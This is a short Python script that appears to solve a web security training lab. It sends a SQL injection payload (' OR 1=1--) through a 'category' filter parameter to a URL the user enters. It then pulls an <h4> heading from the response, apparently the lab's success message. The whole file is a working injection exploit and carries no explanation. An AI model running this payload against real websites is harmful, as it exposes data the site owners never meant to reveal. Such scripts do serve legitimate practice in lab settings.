#!/usr/bin/python3

import urllib3
import re

http = urllib3.PoolManager()
url = input("Please enter the url: ")
pattern="<h4>(C.+?!)</h4>"
win = re.compile(pattern)


payload = "/filter?category=' OR 1=1--"

if url[-1:] == "/":
    url = url[:-1]
r = http.request("GET", url + payload)

print(re.findall(win, str(r.data))[0])
